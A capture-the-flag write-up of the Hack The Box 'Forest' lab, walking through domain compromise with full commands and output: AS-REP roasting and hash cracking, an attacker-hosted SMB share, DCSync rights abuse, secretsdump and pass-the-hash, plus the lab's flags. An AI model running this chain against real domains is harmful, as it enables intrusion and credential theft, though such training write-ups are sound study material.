---
title: Hack The Box - CTF Lab - Forest - Easy
date: 2025-04-08 00:00:01 +0800
image: /images/HackTheBoxForest.jpg
categories: [HTB Labs]
tags: [CPTS, Easy]
---
Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.

Upon connecting to the VPN on the HackTheBox platform, we are given an IP address of the target that is 10.10.10.161. 

I first pinged the target IP but got no response. It took me some time to figure out that HackTheBox's TCP OpenVPN was not working and had to switch to UDP OpenVPN. After that, an nmap scan went smoothly:
```
sudo nmap -sC -sV 10.10.10.161
[sudo] password for kchen: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-08 21:50 EDT
Nmap scan report for 10.10.10.161
Host is up (0.028s latency).
Not shown: 960 closed tcp ports (reset), 29 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-09 01:57:39Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-04-08T18:57:46-07:00
| smb2-time: 
|   date: 2025-04-09T01:57:47
|_  start_date: 2025-04-08T17:08:25
|_clock-skew: mean: 2h26m49s, deviation: 4h02m31s, median: 6m47s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```
We might as well also do a full nmap port scan with -p-
```
sudo nmap -p- -T4 10.10.10.161
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49706/tcp open  unknown
49932/tcp open  unknown
```
I first tried seeing if I could access any websites with the ip on my browser on all of the HTTP ports but that did not give me anything. 

I then tried enumerating for possible subdomains:
```
ffuf -w SecLists/Discovery/DNS/namelist.txt:FUZZ -u http://10.10.10.161/ -H "Host:FUZZ.htb.local"
```
but got nothing.

I see that the SMB service is open on the domain controller. I try using smbclient to authenticate as a null user:
```
smbclient -N -L //10.10.10.161
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```
I get a successful anonymous login but no connection since SMB1 is disabled for security reasons. 

I try using netexec(new crackmapexec) to enumerate shares but I got a permission error. I did get the Windows Server version though:
```
netexec smb 10.10.10.161 --shares -u '' -p ''
Windows Server 2016 Standard 14393 x64
Error enumerating shares: STATUS_ACCESS_DENIED
```

I try rpcclient:
```
rpcclient -U "" 10.10.10.161
Password for [WORKGROUP\]:
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

I try samrdump.py and get a list of accounts on the DC, as well as knowledge that it is using Microsoft Exchange. I save the output for future reference using the following command:
```
samrdump.py 10.10.10.161 > samrdump_output.txt
```
I try smbmap but it throws an error.

I try enum4linux, had to set it up in a virtual environment, and got a lot of potentially useful output:
```
|    Policies via RPC for 10.10.10.161    |
 =========================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: 24
  Minimum password length: 7
  Maximum password age: not set
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: not set

|    Listener Scan on 10.10.10.161    |
 =====================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

[+] Domain: HTB
[+] Domain SID: S-1-5-21-3072663084-364016917-1341370565
[+] Membership: domain member

|    RPC Session Check on 10.10.10.161    |
 =========================================
[*] Check for null session
[+] Server allows session using username '', password ''
```
Since I see that the server allows session using username and password, I try to use smbclient again. I will try with the -smb2 tag as well as trying to enumerate the default $IPC share, which works:
```
smbclient -N -m SMB2 //10.10.10.161/IPC$
Anonymous login successful
Try "help" to get a list of possible commands.
smb>
```
The smb service does not allow us to use "ls" to list the directory unfortunately. I exit out of smbclient and try to connect with a null session using rpcclient -N instead since rpcclient would have more functionality, which works:
```
rpcclient -N -U "" 10.10.10.161
rpcclient $> 
```
but I don't get anything interesting either.

It is possible that SMB is a dead end. We will try exploiting LDAP instead since we see that LDAP is open from enum4linux:
```
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
```
We use this command:
```
ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local"
```
and we get a huge page of domain information, meaning that the domain controller is misconfigured to allow for LDAP binds. 
We can save this output to a text file and be able to pull all of the usernames from the LDAP service using ldapsearch:
```
ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName | grep sAMAccountName | awk '{print $2}'
```
Before attempting a brute force attack, we can use netexec(new crackmapexec) to check the password policy to see how many password attempts we get before accounts get locked out:
```
netexec smb 10.10.10.161 --pass-pol -u '' -p ''
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\: 
SMB         10.10.10.161    445    FOREST           [+] Dumping password info for domain: HTB
SMB         10.10.10.161    445    FOREST           Minimum password length: 7
SMB         10.10.10.161    445    FOREST           Password history length: 24
SMB         10.10.10.161    445    FOREST           Maximum password age: Not Set
SMB         10.10.10.161    445    FOREST           
SMB         10.10.10.161    445    FOREST           Password Complexity Flags: 000000
SMB         10.10.10.161    445    FOREST               Domain Refuse Password Change: 0
SMB         10.10.10.161    445    FOREST               Domain Password Store Cleartext: 0
SMB         10.10.10.161    445    FOREST               Domain Password Lockout Admins: 0
SMB         10.10.10.161    445    FOREST               Domain Password No Clear Change: 0
SMB         10.10.10.161    445    FOREST               Domain Password No Anon Change: 0
SMB         10.10.10.161    445    FOREST               Domain Password Complex: 0
SMB         10.10.10.161    445    FOREST           
SMB         10.10.10.161    445    FOREST           Minimum password age: 1 day 4 minutes 
SMB         10.10.10.161    445    FOREST           Reset Account Lockout Counter: 30 minutes 
SMB         10.10.10.161    445    FOREST           Locked Account Duration: 30 minutes 
SMB         10.10.10.161    445    FOREST           Account Lockout Threshold: None
SMB         10.10.10.161    445    FOREST           Forced Log off Time: Not Set
```
According to this, we get unlimited password attempts since there is no Account Lockout Threshold. 

We can now try a bruteforce attempt using some of the usernames we have from the ldap bind:
```
sebastien
lucinda
andy
mark
santi
svc-alfresco
```
and we can create a mutated password list that contains some of the most common parts of passwords. I used Ippsec's template, where we start with all the months of the year, as well as the current and prior year, the seasons in the year, the word password and secret, the name of the box, and the name htb for the platform.
```
January
Febuary
March
April
May
June
July
August
September
October
November
December
Password
Secret
htb
Forest
Autumn
Spring
Winter
Fall
Summer
```
Another common password is when a word is appended by a recent year, so we can try adding the year the box was created, as well as a year after that.

We can use a bash command to append 2019 and 2020 to the current password list, with 2019 as the box's release date:
```
for i in $(cat passlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done > pwlist.txt
```
After, we can also add an exclamation point:
```
for i in $(cat pwlist.txt); do echo $i; echo ${i}\!; done > t
cat t > pwlist.txt
```
Then we can choose some hashcat rules. According to Ippsec, we should try the best64 rule which does standard password list modifications like converting to l33t, reversing passwords, changing the case, etc. We can also append another rule called toggles1 that toggles various uppercases in the passwords. We can also limit the password length to at least 7 characters, which matches the minimum password length that we got from the domain controller LDAP bind. The overall command:
```
hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0) > 6' > pwlist2.txt
```
We use sort -u to remove any duplicate passwords from the double rule as well as pipe it to a text file.

We then run netexec for the brute force attempt:
```
netexec smb 10.10.10.161 -u users.list -p pwlist2.txt
```
which will run for a good while. 

While we wait, we can browse the Impacket folder to see if we can use any tools against the domain controller.
```
cd /usr/share/doc/python3-impacket/examples
ls
```
We can try running GetNPUsers.py, which tries to find any domain users who do not have Kerberos preauthentication enabled which would allow us to access their TGT/hashed password which we can attempt to crack with hashcat. 

```
kchen@kchenVM:/usr/share/doc/python3-impacket/examples$ GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2025-04-10 21:08:19.513412  2025-04-10 15:59:43.457041  0x410200 

/home/kchen/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$svc-alfresco@HTB.LOCAL:d4b23f646f1c4784603c1f292cf10eff$060acc10e5e9a9a85fde677310206a4b0f378a605cb565c4879ec75d684e66636018da06d07ffa648088410d3abf2721d8981b867abd0c4006699acb67ac33f2dfb97d7a9d5524d9c317e99cb36a3c9c1e6f1397a9d4007c11a59171b437bba2407f588e310dcdeb98e35997e60e4487199b15678286819d3762480e584e9e4fe7038cc5655b941d0e87cb9c2924f75424392fe711799c237a37ad6a7eb83282ec0ed913424409402d43b007cf1ca54b17205f7157e575220b7bf1b4dae1ad5d47ff032640b74ae2cf47655f39ecc7ae41646b490c0641c5d1e9b82a6dee5a141379b8f56415
```

We then run hashcat with Kerberos ASREP method:
```
sudo hashcat -m 18200 hash.txt rockyou.txt
```
and we luckily get a cracked password:
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:d4b23f646f1c4784603c1f292cf10eff$060acc10e5e9a9a85fde677310206a4b0f378a605cb565c4879ec75d684e66636018da06d07ffa648088410d3abf2721d8981b867abd0c4006699acb67ac33f2dfb97d7a9d5524d9c317e99cb36a3c9c1e6f1397a9d4007c11a59171b437bba2407f588e310dcdeb98e35997e60e4487199b15678286819d3762480e584e9e4fe7038cc5655b941d0e87cb9c2924f75424392fe711799c237a37ad6a7eb83282ec0ed913424409402d43b007cf1ca54b17205f7157e575220b7bf1b4dae1ad5d47ff032640b74ae2cf47655f39ecc7ae41646b490c0641c5d1e9b82a6dee5a141379b8f56415:s3rvice
```
s3rvice

Now that we have their domain password, we can try connecting to smb with netexec:
```
netexec smb 10.10.10.161 -u svc-alfresco -p s3rvice 
```

```
netexec smb 10.10.10.161 -u svc-alfresco -p s3rvice

SMB         10.10.10.161    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
```
Netexec gave us a plus symbol but no "pwned" sign, meaning that we cannot login with these credentials. We may be able to enumerate shares though.

```
netexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares
SMB         10.10.10.161    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
SMB         10.10.10.161    445    FOREST           [*] Enumerated shares
SMB         10.10.10.161    445    FOREST           Share           Permissions     Remark
SMB         10.10.10.161    445    FOREST           -----           -----------     ------
SMB         10.10.10.161    445    FOREST           ADMIN$                          Remote Admin
SMB         10.10.10.161    445    FOREST           C$                              Default share
SMB         10.10.10.161    445    FOREST           IPC$            READ            Remote IPC
SMB         10.10.10.161    445    FOREST           NETLOGON        READ            Logon server share 
SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share 
```
An interesting share we see is SYSVOL. We try to connect to SMB using smbclient:
```
smbclient //10.10.10.161/SYSVOL -U svc-alfresco -m SMB2
Password for [WORKGROUP\svc-alfresco]:
Try "help" to get a list of possible commands.
smb: \> get
get <filename> [localname]
smb: \> ls
  .                                   D        0  Wed Sep 18 13:45:49 2019
  ..                                  D        0  Wed Sep 18 13:45:49 2019
  htb.local                          Dr        0  Wed Sep 18 13:45:49 2019

		5069055 blocks of size 4096. 2533698 blocks available
```
But we don't find anything interesting.

We can now move on from SMB, and recall that from our nmap scan that the winRM port 5985 is open, meaning we can use Evil-WinRM to remote into the domain controller with the svc-alfresco and s3rvice credentials. 

```
sudo evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```
We get a shell, and if we cd into Desktop we see a user.txt file.
```
*Evil-WinRM* PS C:\Users\svc-alfresco> cd Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/11/2025  12:26 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
c095053e015dee428a9697e25dde73da
```
### user.txt file found

We see the user folders sebastien and Administrator but we do not have the permission to cd to them. Since we already have a domain user account, what we need is to escalate to SYSTEM. We can try using WinPEAS which will automatically scan for privilege escalation paths in a Windows machine. 

We  go on github and clone the winpeas repository and copy it as a folder on our local attack box:
```
git clone https://github.com/peass-ng/PEASS-ng
```

We then will setup an SMB server in the winpeas directory so that we upload the WinPEAS script through the open SMB service using impacket:
```
sudo smbserver.py localserver $(pwd) -smb2support -user kchen -password 123
```
Back on Win-RM, we need to create a PSCredential so that we can use it as authentication when connecting to our SMB server.
```
$pass = convertto-securestring '123' -AsPlainText -Force
$pass
$cred = New-Object System.Management.Automation.PSCredential('kchen',$pass)
New-PSDrive -Name kchen -PSProvider FileSystem -Credential $cred -Root \\10.10.14.2
```
We successfully connect, and use the move command "mv" to move files around. We then move WinPEAS64.exe from our attack box to the forest box. We probably could just use Evil-WinRM's upload and download function as well. After WinPEAS runs, it gives us a bunch of information but nothing that we can really use.

We next try using SharpHound to enumerate the entire domain. We upload SharpHound.exe to the box and run it with 
```
SharpHound.exe -c All 
```

We then run Bloodhound and upload the data from the zip file. We search for a path from svc-alfresco to administrator@htb.local. I tried adjusting path but did not see anything exploitable, so I run SharpHound.exe again but this time with the -c DCOnly method so that we can decrease the amount of clutter in BloodHound that may be affecting the paths.

```
SharpHound.exe -c DCOnly
```

This time we get a valid path to Administrator by using the GenericAll permission of svc-alfresco in the Account Operators group to add users to the Exchange Windows Permissions group.

We know that svc-alfresco has GenericAll to Account Operators which grants us account creation privileges. We can use this to create a new account and add it to the EXCHANGE WINDOWS PERMISSIONS group that we have genericall permissions to. 
```
net user test1 test123 /add /domain
net group "EXCHANGE WINDOWS PERMISSIONS" /add test1
```
We then import PowerView.ps1 with Evil-WinRM so that we can create a PSCredential object to authenticate to the DC. 
```
download PowerView.ps1
Import-Module /path/PowerView.ps1
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('domain\username', $SecPassword)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity test1 -Rights DCSync
```
Then we can use secretsdump on our box to dump hashes after the command successfully runs:
```
./secretsdump.py htb.local/test1:test123@10.10.10.161
```
We get the administrator hash:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```
We take the NTLM hash on the right and use it to authenticate as a pass the hash attack with Evil-WINRM or any other remote tool you'd like:
```
sudo evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```
Then we simply cd to the desktop and get the final root flag:
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
c768b23a159c977fb5f02c7fb13cc7b6
```
### root.txt file found

That is it, we have successfully found both user.txt and root.txt files that the box is asking for by escalating to Domain/Enterprise admin on the domain controller, primarily by abusing the open Kerberos service and kerberos-preauthentication disabled. 